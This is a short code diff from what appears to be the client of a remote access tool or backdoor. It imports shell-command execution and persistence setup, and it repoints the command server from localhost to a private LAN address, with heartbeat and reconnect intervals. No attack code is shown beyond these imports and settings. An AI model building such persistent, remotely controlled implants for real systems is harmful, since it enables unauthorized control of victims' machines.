@@ -6,7 +6,7 @@ from shell import run_command
 from helper import send_json, receive_json
 from persistence import setup_persistence
 
-SERVER_HOST = "127.0.0.1"
+SERVER_HOST = "192.168.10.150"
 SERVER_PORT = 8080
 SEND_HEARTBEAT_INTERVAL = 180
 RETRY_CONNECT_INTERVAL = 10
